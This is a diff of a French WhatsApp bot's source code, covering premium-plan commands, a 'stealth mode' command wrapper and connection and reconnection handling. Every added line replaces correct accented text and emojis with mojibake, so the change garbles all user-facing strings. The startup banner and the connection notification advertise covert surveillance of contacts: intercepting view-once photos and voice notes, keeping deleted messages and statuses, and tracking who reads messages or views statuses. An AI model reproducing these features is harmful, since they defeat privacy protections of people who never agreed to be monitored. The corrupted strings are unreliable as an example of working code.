+        return send(`ðŸ“‹ *Usage:* .addpremium @user <plan> [jours]\n\nðŸ’¡ Exemple: \`.addpremium @user or 30\``);
       }
       
       const validPlans = ["BRONZE", "ARGENT", "OR", "DIAMANT", "LIFETIME"];
       if (!validPlans.includes(plan)) {
-        return send(`❌ Plan invalide. Plans: bronze, argent, or, diamant, lifetime`);
+        return send(`âŒ Plan invalide. Plans: bronze, argent, or, diamant, lifetime`);
       }
       
       const result = premiumDB.addPremium(targetJid, plan, days);
       
       if (result.success) {
-        const planEmojis = { BRONZE: "🥉", ARGENT: "🥈", OR: "🥇", DIAMANT: "💎", LIFETIME: "👑" };
-        return send(`✅ ${planEmojis[plan]} Premium ${plan} ajouté pour +${targetJid.split("@")[0]}\n📅 Durée: ${plan === "LIFETIME" ? "À vie" : days + " jours"}`);
+        const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
+        return send(`âœ… ${planEmojis[plan]} Premium ${plan} ajoutÃ© pour +${targetJid.split("@")[0]}\nðŸ“… DurÃ©e: ${plan === "LIFETIME" ? "Ã€ vie" : days + " jours"}`);
       } else {
-        return send(`❌ Erreur: ${result.message}`);
+        return send(`âŒ Erreur: ${result.message}`);
       }
     }
 
     case "delpremium":
     case "removepremium": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetJid = mentioned[0];
       if (!targetJid && args) {
@@ -7119,37 +7119,37 @@ C'est ton identifiant WhatsApp.
       }
       
       if (!targetJid) {
-        return send(`📋 *Usage:* .delpremium @user\n\n💡 Exemple: \`.delpremium @user\``);
+        return send(`ðŸ“‹ *Usage:* .delpremium @user\n\nðŸ’¡ Exemple: \`.delpremium @user\``);
       }
       
       const result = premiumDB.removePremium(targetJid);
       
       if (result.success) {
-        return send(`✅ Premium supprimé pour +${targetJid.split("@")[0]}`);
+        return send(`âœ… Premium supprimÃ© pour +${targetJid.split("@")[0]}`);
       } else {
-        return send(`❌ ${result.message}`);
+        return send(`âŒ ${result.message}`);
       }
     }
 
     case "premiumlist":
     case "listpremium": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const users = premiumDB.getAllPremiumUsers();
       
       if (users.length === 0) {
-        return send(`📋 *Aucun utilisateur premium*\n\n💡 Ajoutez avec \`.addpremium @user <plan>\``);
+        return send(`ðŸ“‹ *Aucun utilisateur premium*\n\nðŸ’¡ Ajoutez avec \`.addpremium @user <plan>\``);
       }
       
-      let text = `👑 ═══════════════════════════\n`;
+      let text = `ðŸ‘‘ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       text += `   *UTILISATEURS PREMIUM*\n`;
-      text += `═══════════════════════════\n\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      const planEmojis = { BRONZE: "🥉", ARGENT: "🥈", OR: "🥇", DIAMANT: "💎", LIFETIME: "👑" };
+      const planEmojis = { BRONZE: "ðŸ¥‰", ARGENT: "ðŸ¥ˆ", OR: "ðŸ¥‡", DIAMANT: "ðŸ’Ž", LIFETIME: "ðŸ‘‘" };
       
       users.forEach((u, i) => {
         const num = u.jid.split("@")[0];
-        text += `${i + 1}. ${planEmojis[u.plan] || "📦"} +${num}\n`;
+        text += `${i + 1}. ${planEmojis[u.plan] || "ðŸ“¦"} +${num}\n`;
         text += `   Plan: ${u.plan}`;
         if (u.plan !== "LIFETIME" && u.expiresAt) {
           const daysLeft = Math.ceil((new Date(u.expiresAt) - new Date()) / (1000 * 60 * 60 * 24));
@@ -7158,31 +7158,31 @@ C'est ton identifiant WhatsApp.
         text += `\n\n`;
       });
       
-      text += `📊 *Total:* ${users.length} utilisateurs premium`;
+      text += `ðŸ“Š *Total:* ${users.length} utilisateurs premium`;
       return send(text);
     }
 
     case "premiumstats": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const stats = premiumDB.getStats();
       
-      let text = `📊 ═══════════════════════════\n`;
+      let text = `ðŸ“Š â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       text += `   *STATISTIQUES PREMIUM*\n`;
-      text += `═══════════════════════════\n\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      text += `👥 *Utilisateurs:*\n`;
-      text += `   • Total premium: ${stats.totalPremium}\n`;
-      text += `   • Lifetime: ${stats.byPlan?.LIFETIME || 0}\n`;
-      text += `   • Diamant: ${stats.byPlan?.DIAMANT || 0}\n`;
-      text += `   • Or: ${stats.byPlan?.OR || 0}\n`;
-      text += `   • Argent: ${stats.byPlan?.ARGENT || 0}\n`;
-      text += `   • Bronze: ${stats.byPlan?.BRONZE || 0}\n\n`;
+      text += `ðŸ‘¥ *Utilisateurs:*\n`;
+      text += `   â€¢ Total premium: ${stats.totalPremium}\n`;
+      text += `   â€¢ Lifetime: ${stats.byPlan?.LIFETIME || 0}\n`;
+      text += `   â€¢ Diamant: ${stats.byPlan?.DIAMANT || 0}\n`;
+      text += `   â€¢ Or: ${stats.byPlan?.OR || 0}\n`;
+      text += `   â€¢ Argent: ${stats.byPlan?.ARGENT || 0}\n`;
+      text += `   â€¢ Bronze: ${stats.byPlan?.BRONZE || 0}\n\n`;
       
-      text += `🔑 *Codes:*\n`;
-      text += `   • Générés: ${stats.totalCodes || 0}\n`;
-      text += `   • Utilisés: ${stats.usedCodes || 0}\n`;
-      text += `   • Disponibles: ${stats.unusedCodes || 0}\n\n`;
+      text += `ðŸ”‘ *Codes:*\n`;
+      text += `   â€¢ GÃ©nÃ©rÃ©s: ${stats.totalCodes || 0}\n`;
+      text += `   â€¢ UtilisÃ©s: ${stats.usedCodes || 0}\n`;
+      text += `   â€¢ Disponibles: ${stats.unusedCodes || 0}\n\n`;
       
       const revenue = (stats.byPlan?.BRONZE || 0) * 500 +
                       (stats.byPlan?.ARGENT || 0) * 1000 +
@@ -7190,71 +7190,71 @@ C'est ton identifiant WhatsApp.
                       (stats.byPlan?.DIAMANT || 0) * 5000 +
                       (stats.byPlan?.LIFETIME || 0) * 15000;
       
-      text += `💰 *Revenus estimés:* ${revenue.toLocaleString()} FCFA`;
+      text += `ðŸ’° *Revenus estimÃ©s:* ${revenue.toLocaleString()} FCFA`;
       
       return send(text);
     }
 
     case "premiumhelp": {
-      let text = `💎 ═══════════════════════════\n`;
+      let text = `ðŸ’Ž â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
       text += `   *AIDE PREMIUM*\n`;
-      text += `═══════════════════════════\n\n`;
+      text += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      text += `📋 *Commandes utilisateur:*\n`;
-      text += `• \`.premium\` - Voir son plan\n`;
-      text += `• \`.plans\` - Voir les offres\n`;
-      text += `• \`.upgrade <plan>\` - S'abonner\n`;
-      text += `• \`.redeem <code>\` - Activer un code\n\n`;
+      text += `ðŸ“‹ *Commandes utilisateur:*\n`;
+      text += `â€¢ \`.premium\` - Voir son plan\n`;
+      text += `â€¢ \`.plans\` - Voir les offres\n`;
+      text += `â€¢ \`.upgrade <plan>\` - S'abonner\n`;
+      text += `â€¢ \`.redeem <code>\` - Activer un code\n\n`;
       
       if (isOwner) {
-        text += `👑 *Commandes owner:*\n`;
-        text += `• \`.gencode <plan>\` - Générer 1 code\n`;
-        text += `• \`.gencodes <plan> <nb>\` - Générer plusieurs\n`;
-        text += `• \`.listcodes\` - Voir codes disponibles\n`;
-        text += `• \`.addpremium @user <plan>\` - Ajouter premium\n`;
-        text += `• \`.delpremium @user\` - Retirer premium\n`;
-        text += `• \`.premiumlist\` - Liste des premium\n`;
-        text += `• \`.premiumstats\` - Statistiques\n`;
+        text += `ðŸ‘‘ *Commandes owner:*\n`;
+        text += `â€¢ \`.gencode <plan>\` - GÃ©nÃ©rer 1 code\n`;
+        text += `â€¢ \`.gencodes <plan> <nb>\` - GÃ©nÃ©rer plusieurs\n`;
+        text += `â€¢ \`.listcodes\` - Voir codes disponibles\n`;
+        text += `â€¢ \`.addpremium @user <plan>\` - Ajouter premium\n`;
+        text += `â€¢ \`.delpremium @user\` - Retirer premium\n`;
+        text += `â€¢ \`.premiumlist\` - Liste des premium\n`;
+        text += `â€¢ \`.premiumstats\` - Statistiques\n`;
       }
       
       return send(text);
     }
 
     default: {
-      // ═══════════════════════════════════════════════════════════
-      // 🔌 EXÉCUTION DES COMMANDES MODULAIRES (OVLCMD)
-      // ═══════════════════════════════════════════════════════════
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+      // ðŸ”Œ EXÃ‰CUTION DES COMMANDES MODULAIRES (OVLCMD)
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
       
-      // Chercher la commande dans le système ovlcmd
+      // Chercher la commande dans le systÃ¨me ovlcmd
       const ovlCommand = findCommand(command);
       
       if (ovlCommand) {
-        console.log(`[OVLCMD] 📦 Exécution de la commande modulaire: ${command}`);
+        console.log(`[OVLCMD] ðŸ“¦ ExÃ©cution de la commande modulaire: ${command}`);
         
-        // 🕵️ MODE FURTIF: Wrapper pour ovl.sendMessage
-        // Redirige TOUS les messages vers "Moi-même" (botNumber)
+        // ðŸ•µï¸ MODE FURTIF: Wrapper pour ovl.sendMessage
+        // Redirige TOUS les messages vers "Moi-mÃªme" (botNumber)
         const stealthOvl = {
           ...hani,
           sendMessage: async (jid, content, options = {}) => {
-            // Toujours envoyer vers botNumber (Moi-même)
-            console.log(`[STEALTH] 📤 Redirection: ${jid} → ${botNumber}`);
+            // Toujours envoyer vers botNumber (Moi-mÃªme)
+            console.log(`[STEALTH] ðŸ“¤ Redirection: ${jid} â†’ ${botNumber}`);
             return await hani.sendMessage(botNumber, content, options);
           }
         };
         
-        // Préparer les options pour ovlcmd - COMPLET avec toutes les variables attendues
+        // PrÃ©parer les options pour ovlcmd - COMPLET avec toutes les variables attendues
         const cmdOptions = {
           // Arguments
           arg: args ? args.split(" ").filter(a => a) : [],
           args: args || "",
           texte: args || "",
           
-          // Message et réponse
+          // Message et rÃ©ponse
           ms: msg,
           repondre: reply,
           send: send,
           
-          // Expéditeur
+          // ExpÃ©diteur
           sender: sender,
           from: from,
           auteur_Msg: sender,
@@ -7273,7 +7273,7 @@ C'est ton identifiant WhatsApp.
           admin_Groupe: isBotAdmin,
           isBotAdmin: isBotAdmin,
           
-          // Métadonnées groupe
+          // MÃ©tadonnÃ©es groupe
           groupMetadata: groupMetadata,
           infosGroupe: groupMetadata,
           
@@ -7298,39 +7298,39 @@ C'est ton identifiant WhatsApp.
         };
         
         try {
-          // Utiliser stealthOvl pour rediriger les messages vers "Moi-même"
+          // Utiliser stealthOvl pour rediriger les messages vers "Moi-mÃªme"
           await executeCommand(command, stealthOvl, msg, cmdOptions);
-          console.log(`[OVLCMD] ✅ Commande ${command} exécutée (mode furtif)`);
+          console.log(`[OVLCMD] âœ… Commande ${command} exÃ©cutÃ©e (mode furtif)`);
         } catch (err) {
-          console.error(`[OVLCMD] ❌ Erreur commande ${command}:`, err.message);
-          await send(`❌ Erreur lors de l'exécution de la commande: ${err.message}`);
+          console.error(`[OVLCMD] âŒ Erreur commande ${command}:`, err.message);
+          await send(`âŒ Erreur lors de l'exÃ©cution de la commande: ${err.message}`);
         }
         return;
       }
       
-      // Commande non trouvée - ne pas répondre
-      console.log(`[CMD] ⚠️ Commande inconnue: ${command}`);
+      // Commande non trouvÃ©e - ne pas rÃ©pondre
+      console.log(`[CMD] âš ï¸ Commande inconnue: ${command}`);
       return;
     }
   }
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🚀 DÉMARRAGE DU BOT
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸš€ DÃ‰MARRAGE DU BOT
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 let hani = null;
 
-// 🔒 Paramètres de reconnexion ULTRA STABLE
+// ðŸ”’ ParamÃ¨tres de reconnexion ULTRA STABLE
 const RECONNECT_CONFIG = {
   maxAttempts: 50,           // 50 tentatives max
-  baseDelay: 1500,           // Délai initial 1.5s (plus rapide)
+  baseDelay: 1500,           // DÃ©lai initial 1.5s (plus rapide)
   maxDelay: 120000,          // Max 2 minutes (pas 5)
   multiplier: 1.3,           // Exponential backoff plus doux
   jitter: 0.2                // 20% de variation
 };
 
-// 🔄 Ping keep-alive pour maintenir la connexion active
+// ðŸ”„ Ping keep-alive pour maintenir la connexion active
 let keepAliveInterval = null;
 let connectionHealthCheck = null;
 
@@ -7343,18 +7343,18 @@ function calculateReconnectDelay(attempt) {
   return Math.floor(baseDelay + jitter);
 }
 
-// 🔒 Verrou anti-reconnexion multiple
+// ðŸ”’ Verrou anti-reconnexion multiple
 let isReconnecting = false;
 
 async function startBot() {
-  // Éviter les reconnexions multiples simultanées
+  // Ã‰viter les reconnexions multiples simultanÃ©es
   if (isReconnecting) {
-    console.log('[!] Reconnexion déjà en cours, ignoré...');
+    console.log('[!] Reconnexion dÃ©jÃ  en cours, ignorÃ©...');
     return;
   }
   isReconnecting = true;
 
-  // 🛑 Fermer proprement l'ancienne connexion si elle existe
+  // ðŸ›‘ Fermer proprement l'ancienne connexion si elle existe
   if (hani) {
     try {
       console.log('[...] Fermeture de l\'ancienne connexion...');
@@ -7373,16 +7373,16 @@ async function startBot() {
 |                                                           |
 |              * HANI-MD V2.6.0 SECURE *                    |
 |         Bot WhatsApp Intelligent par H2025                |
-|            🔒 Sécurité Renforcée Activée                  |
+|            ðŸ”’ SÃ©curitÃ© RenforcÃ©e ActivÃ©e                  |
 |                                                           |
 +-----------------------------------------------------------+
 |  [QR] Scanne le QR code avec WhatsApp                       |
-|  [CFG]  Préfixe: ${config.PREFIXE.padEnd(42)}|
+|  [CFG]  PrÃ©fixe: ${config.PREFIXE.padEnd(42)}|
 |  [OWNER] Owner: ${config.NOM_OWNER.padEnd(44)}|
 +-----------------------------------------------------------+
 `);
 
-  // Créer les dossiers nécessaires
+  // CrÃ©er les dossiers nÃ©cessaires
   if (!fs.existsSync("./DataBase")) {
     fs.mkdirSync("./DataBase", { recursive: true });
   }
@@ -7392,39 +7392,39 @@ async function startBot() {
     await restoreSessionFromId();
   }
   
-  // Créer le dossier session si nécessaire
+  // CrÃ©er le dossier session si nÃ©cessaire
   if (!fs.existsSync(SESSION_FOLDER)) {
     fs.mkdirSync(SESSION_FOLDER, { recursive: true });
   }
 
   const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);
 
-  // 🔒 Compteur de reconnexion amélioré
+  // ðŸ”’ Compteur de reconnexion amÃ©liorÃ©
   let reconnectAttempts = 0;
   const MAX_RECONNECT_ATTEMPTS = RECONNECT_CONFIG.maxAttempts;
   let isConnected = false;
   let lastBackupTime = Date.now();
 
-  // Sauvegarder les credentials immédiatement et régulièrement
+  // Sauvegarder les credentials immÃ©diatement et rÃ©guliÃ¨rement
   const saveCredsWrapper = async () => {
     try {
       await saveCreds();
-      console.log("[SAVE] Session sauvegardée");
+      console.log("[SAVE] Session sauvegardÃ©e");
       
-      // 🔒 Créer un backup sécurisé toutes les heures
+      // ðŸ”’ CrÃ©er un backup sÃ©curisÃ© toutes les heures
       if (securityManager && Date.now() - lastBackupTime > 60 * 60 * 1000) {
         try {
           await securityManager.createBackup();
           lastBackupTime = Date.now();
-          console.log("[BACKUP] ✅ Backup automatique créé");
+          console.log("[BACKUP] âœ… Backup automatique crÃ©Ã©");
         } catch (e) {}
       }
     } catch (e) {
-      console.log("⚠️ Erreur sauvegarde session:", e.message);
+      console.log("âš ï¸ Erreur sauvegarde session:", e.message);
     }
   };
 
-  // 🛑 Nettoyer les anciens intervals si existants
+  // ðŸ›‘ Nettoyer les anciens intervals si existants
   if (keepAliveInterval) clearInterval(keepAliveInterval);
   if (connectionHealthCheck) clearInterval(connectionHealthCheck);
 
@@ -7446,19 +7446,19 @@ async function startBot() {
     fireInitQueries: true,
     qrTimeout: 60000,                     // 1min pour scanner QR
     printQRInTerminal: false,
-    // ⚠️ NE PAS ignorer status@broadcast pour intercepter les statuts
+    // âš ï¸ NE PAS ignorer status@broadcast pour intercepter les statuts
     getMessage: async (key) => {
       return { conversation: "" };
     },
   });
 
-  // 🔓 Libérer le verrou après création du socket
+  // ðŸ”“ LibÃ©rer le verrou aprÃ¨s crÃ©ation du socket
   isReconnecting = false;
 
-  // 🚫 SUPPRIMÉ: keepAlive qui causait des conflits de session
-  // Le keepAliveIntervalMs de Baileys gère déjà le ping automatiquement
+  // ðŸš« SUPPRIMÃ‰: keepAlive qui causait des conflits de session
+  // Le keepAliveIntervalMs de Baileys gÃ¨re dÃ©jÃ  le ping automatiquement
 
-  // ────────── ÉVÉNEMENTS DE CONNEXION ──────────
+  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ã‰VÃ‰NEMENTS DE CONNEXION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   hani.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect, qr } = update;
 
@@ -7471,7 +7471,7 @@ async function startBot() {
       qrState.connectionStatus = "waiting_qr";
       qrState.qrCount++;
       
-      // Générer le QR en image base64 pour le web
+      // GÃ©nÃ©rer le QR en image base64 pour le web
       try {
         qrState.qrDataURL = await qrcodeWeb.toDataURL(qr, {
           width: 300,
@@ -7479,7 +7479,7 @@ async function startBot() {
           color: { dark: "#000000", light: "#ffffff" }
         });
       } catch (e) {
-        console.log("⚠️ Erreur génération QR image:", e.message);
+        console.log("âš ï¸ Erreur gÃ©nÃ©ration QR image:", e.message);
       }
       
       console.log("\n[QR] SCANNE CE QR CODE AVEC WHATSAPP:\n");
@@ -7511,10 +7511,10 @@ async function startBot() {
         connectedAt: new Date().toISOString()
       };
       
-      // 🤖 ENREGISTRER LE BOT (celui qui a scanné le QR)
-      // ATTENTION: Le bot n'est PAS l'owner ! L'owner est défini dans .env (NUMERO_OWNER)
+      // ðŸ¤– ENREGISTRER LE BOT (celui qui a scannÃ© le QR)
+      // ATTENTION: Le bot n'est PAS l'owner ! L'owner est dÃ©fini dans .env (NUMERO_OWNER)
       if (botNumber) {
-        // Enregistrer le bot dans la base de données comme "bot" (pas owner!)
+        // Enregistrer le bot dans la base de donnÃ©es comme "bot" (pas owner!)
         if (!db.data.users[botJid]) {
           db.data.users[botJid] = {
             name: botName,
@@ -7527,24 +7527,24 @@ async function startBot() {
         } else {
           db.data.users[botJid].name = botName;
           db.data.users[botJid].isBot = true;
-          // Ne pas changer le role si déjà défini
+          // Ne pas changer le role si dÃ©jÃ  dÃ©fini
         }
         db.save();
-        console.log(`[DB] 🤖 Bot enregistré: ${botName} (${botNumber})`);
-        console.log(`[DB] 👑 Owner défini dans .env: ${config.NUMERO_OWNER}`);
+        console.log(`[DB] ðŸ¤– Bot enregistrÃ©: ${botName} (${botNumber})`);
+        console.log(`[DB] ðŸ‘‘ Owner dÃ©fini dans .env: ${config.NUMERO_OWNER}`);
       }
       
       reconnectAttempts = 0;
       
-      // Sauvegarder immédiatement après connexion réussie
+      // Sauvegarder immÃ©diatement aprÃ¨s connexion rÃ©ussie
       await saveCredsWrapper();
       
-      // Sauvegarder encore après 2 secondes pour être sûr
+      // Sauvegarder encore aprÃ¨s 2 secondes pour Ãªtre sÃ»r
       setTimeout(async () => {
         await saveCredsWrapper();
       }, 2000);
       
-      // Sauvegarder périodiquement toutes les 5 minutes
+      // Sauvegarder pÃ©riodiquement toutes les 5 minutes
       setInterval(async () => {
         if (isConnected) {
           await saveCredsWrapper();
@@ -7553,59 +7553,59 @@ async function startBot() {
       
       console.log(`
 +-----------------------------------------------------------+
-|              [OK] HANI-MD CONNECTÉ !                        |
+|              [OK] HANI-MD CONNECTÃ‰ !                        |
 +-----------------------------------------------------------+
 |  [BOT] Bot: ${(hani.user?.name || "HANI-MD").padEnd(47)}|
-|  [QR] Numéro: ${(hani.user?.id?.split(":")[0] || "").padEnd(44)}|
-|  [CFG]  Préfixe: ${config.PREFIXE.padEnd(42)}|
+|  [QR] NumÃ©ro: ${(hani.user?.id?.split(":")[0] || "").padEnd(44)}|
+|  [CFG]  PrÃ©fixe: ${config.PREFIXE.padEnd(42)}|
 |  [WEB] Mode: ${config.MODE.padEnd(46)}|
 +-----------------------------------------------------------+
-|  [SHIELD] PROTECTIONS AUTOMATIQUES ACTIVÉES:                   |
+|  [SHIELD] PROTECTIONS AUTOMATIQUES ACTIVÃ‰ES:                   |
 |    [OK] Anti-delete messages                                |
-|    [OK] Vue unique photos/vidéos                            |
-|    [OK] Écoute unique vocaux                                |
+|    [OK] Vue unique photos/vidÃ©os                            |
+|    [OK] Ã‰coute unique vocaux                                |
 |    [OK] Sauvegarde automatique statuts                      |
 |    [OK] Anti-suppression statuts                            |
 |    [OK] Anti-appel                                          |
 |    [OK] Anti-bot (bloque autres bots)                       |
 +-----------------------------------------------------------+
 |  [TIP] Tape ${config.PREFIXE}menu pour voir les commandes              |
-|  [MSG] Tout est envoyé automatiquement dans "Moi-même"       |
+|  [MSG] Tout est envoyÃ© automatiquement dans "Moi-mÃªme"       |
 +-----------------------------------------------------------+
 `);
       db.data.stats.startTime = Date.now();
       db.save();
       
-      // 🔔 Envoyer notification de connexion dans "Moi-même"
+      // ðŸ”” Envoyer notification de connexion dans "Moi-mÃªme"
       try {
         const botJid = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
-        console.log(`[DEBUG] Envoi notification connexion à: ${botJid}`);
+        console.log(`[DEBUG] Envoi notification connexion Ã : ${botJid}`);
         await hani.sendMessage(botJid, {
-          text: `✅ *HANI-MD CONNECTÉ !*
+          text: `âœ… *HANI-MD CONNECTÃ‰ !*
           
-🤖 Bot: ${hani.user?.name || "HANI-MD"}
-📱 Numéro: +${hani.user?.id?.split(":")[0]}
-⚙️ Préfixe: ${config.PREFIXE}
-🕐 Connecté le: ${new Date().toLocaleString("fr-FR")}
+ðŸ¤– Bot: ${hani.user?.name || "HANI-MD"}
+ðŸ“± NumÃ©ro: +${hani.user?.id?.split(":")[0]}
+âš™ï¸ PrÃ©fixe: ${config.PREFIXE}
+ðŸ• ConnectÃ© le: ${new Date().toLocaleString("fr-FR")}
 
-🛡️ *NOTIFICATIONS AUTOMATIQUES:*
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-📖 T'a écrit → ✅ ACTIF
-📖 Message lu par → ✅ ACTIF  
-👁️ Statut vu par → ✅ ACTIF
-🕵️ Présence détectée → ✅ ACTIF
-🗑️ Message supprimé → ✅ ACTIF
-📸 Vue unique interceptée → ✅ ACTIF
-🎤 Vocal écoute unique → ✅ ACTIF
-📺 Statut supprimé → ✅ ACTIF
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-📵 Appel rejeté → 🔇 Actif seulement en mode invisible
-   ➜ Tape *${config.PREFIXE}invisible on* pour activer
+ðŸ›¡ï¸ *NOTIFICATIONS AUTOMATIQUES:*
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
+ðŸ“– T'a Ã©crit â†’ âœ… ACTIF
+ðŸ“– Message lu par â†’ âœ… ACTIF  
+ðŸ‘ï¸ Statut vu par â†’ âœ… ACTIF
+ðŸ•µï¸ PrÃ©sence dÃ©tectÃ©e â†’ âœ… ACTIF
+ðŸ—‘ï¸ Message supprimÃ© â†’ âœ… ACTIF
+ðŸ“¸ Vue unique interceptÃ©e â†’ âœ… ACTIF
+ðŸŽ¤ Vocal Ã©coute unique â†’ âœ… ACTIF
+ðŸ“º Statut supprimÃ© â†’ âœ… ACTIF
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
+ðŸ“µ Appel rejetÃ© â†’ ðŸ”‡ Actif seulement en mode invisible
+   âžœ Tape *${config.PREFIXE}invisible on* pour activer
 
-💡 Toutes les notifications arrivent ici automatiquement!
-📝 Tape *${config.PREFIXE}menu* pour les commandes`
+ðŸ’¡ Toutes les notifications arrivent ici automatiquement!
+ðŸ“ Tape *${config.PREFIXE}menu* pour les commandes`
         });
-        console.log("[OK] Notification de connexion envoyée dans Moi-même");
+        console.log("[OK] Notification de connexion envoyÃ©e dans Moi-mÃªme");
       } catch (e) {
         console.log("[!] Erreur envoi notification connexion:", e.message);
       }
@@ -7620,42 +7620,42 @@ async function startBot() {
       const statusCode = lastDisconnect?.error?.output?.statusCode;
       const reason = lastDisconnect?.error?.message || "Inconnue";
 
-      console.log(`\n[!] Déconnexion (code: ${statusCode}, raison: ${reason})`);
+      console.log(`\n[!] DÃ©connexion (code: ${statusCode}, raison: ${reason})`);
 
-      // 🔒 Détecter si c'est un VRAI conflit de session (mot "conflict" explicite)
+      // ðŸ”’ DÃ©tecter si c'est un VRAI conflit de session (mot "conflict" explicite)
       // "Stream Errored" seul n'est PAS un conflit, c'est souvent un restart normal
       const isConflict = (reason.toLowerCase().includes("conflict") && !reason.toLowerCase().includes("restart")) ||
                          statusCode === 440;
       
-      // Conflit de session RÉEL - NE PAS reconnecter automatiquement
+      // Conflit de session RÃ‰EL - NE PAS reconnecter automatiquement
       if (isConflict) {
-        console.log("[⚠️] CONFLIT DE SESSION DÉTECTÉ!");
+        console.log("[âš ï¸] CONFLIT DE SESSION DÃ‰TECTÃ‰!");
         console.log("[!] Une autre instance du bot tourne probablement ailleurs.");
-        console.log("[TIP] Vérifications à faire:");
+        console.log("[TIP] VÃ©rifications Ã  faire:");
         console.log("     1. Ferme WhatsApp Web dans tous les navigateurs");
-        console.log("     2. Vérifie si le bot tourne sur un serveur (Heroku, Railway, etc.)");
-        console.log("     3. Vérifie les appareils connectés sur WhatsApp mobile");
-        console.log("[STOP] Le bot va s'arrêter pour éviter les conflits.");
-        console.log("[CMD] Redémarre manuellement avec: pm2 restart hani");
+        console.log("     2. VÃ©rifie si le bot tourne sur un serveur (Heroku, Railway, etc.)");
+        console.log("     3. VÃ©rifie les appareils connectÃ©s sur WhatsApp mobile");
+        console.log("[STOP] Le bot va s'arrÃªter pour Ã©viter les conflits.");
+        console.log("[CMD] RedÃ©marre manuellement avec: pm2 restart hani");
         isReconnecting = false;
         return;
       }
       
-      // Redémarrage requis par WhatsApp (515, 408, ou "restart required")
+      // RedÃ©marrage requis par WhatsApp (515, 408, ou "restart required")
       if (statusCode === 515 || statusCode === 408 || reason.toLowerCase().includes("restart")) {
-        console.log("[🔄] Redémarrage requis par WhatsApp...");
+        console.log("[ðŸ”„] RedÃ©marrage requis par WhatsApp...");
         isReconnecting = false;
         await delay(2000);
         startBot();
         return;
       }
       
-      // Session vraiment expirée (401) - nouveau QR requis
+      // Session vraiment expirÃ©e (401) - nouveau QR requis
       if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
-        console.log("[X] Session expirée. Suppression et nouveau QR...");
+        console.log("[X] Session expirÃ©e. Suppression et nouveau QR...");
         if (fs.existsSync(SESSION_FOLDER)) {
           fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
-          console.log("[OK] Session supprimée.");
+          console.log("[OK] Session supprimÃ©e.");
         }
         reconnectAttempts = 0;
         isReconnecting = false;
@@ -7664,7 +7664,7 @@ async function startBot() {
       } 
       // 428 = Connection Closed - Reconnecter SANS supprimer la session
       else if (statusCode === 428) {
-        console.log("[🔄] Connection fermée temporairement (428)");
+        console.log("[ðŸ”„] Connection fermÃ©e temporairement (428)");
         reconnectAttempts++;
         if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
           const waitTime = Math.min(3000 * reconnectAttempts, 20000); // Max 20s
@@ -7673,8 +7673,8 @@ async function startBot() {
           await delay(waitTime);
           startBot();
         } else {
-          // Après plusieurs échecs, supprimer et demander nouveau QR
-          console.log("[X] Échecs répétés. Nouveau QR code requis...");
+          // AprÃ¨s plusieurs Ã©checs, supprimer et demander nouveau QR
+          console.log("[X] Ã‰checs rÃ©pÃ©tÃ©s. Nouveau QR code requis...");
           if (fs.existsSync(SESSION_FOLDER)) {
             fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
           }
@@ -7684,12 +7684,12 @@ async function startBot() {
           startBot();
         }
       }
-      // 🔒 Autres erreurs - reconnexion avec exponential backoff
+      // ðŸ”’ Autres erreurs - reconnexion avec exponential backoff
       else {
         reconnectAttempts++;
         if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
           const waitTime = calculateReconnectDelay(reconnectAttempts);
